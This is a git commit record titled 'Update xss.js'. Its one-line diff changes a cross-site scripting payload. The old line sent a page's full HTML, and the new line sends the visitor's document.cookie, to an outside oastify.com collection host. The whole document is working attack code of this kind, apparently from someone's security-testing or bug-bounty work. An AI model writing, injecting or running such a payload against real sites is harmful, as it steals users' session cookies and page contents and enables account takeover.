0d00fee2032abc76cb81f811890ba7b3ee8b35d7
Shlok K <130390684+pphreak-1001@users.noreply.github.com>
2025-08-11 02:08:37 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-fetch('https://t2w7jpa0u53so8op8dyloyhxlorlfc31.oastify.com?c=' + document.documentElement.outerHTML)
+fetch('https://t2w7jpa0u53so8op8dyloyhxlorlfc31.oastify.com?c=' + document.cookie)
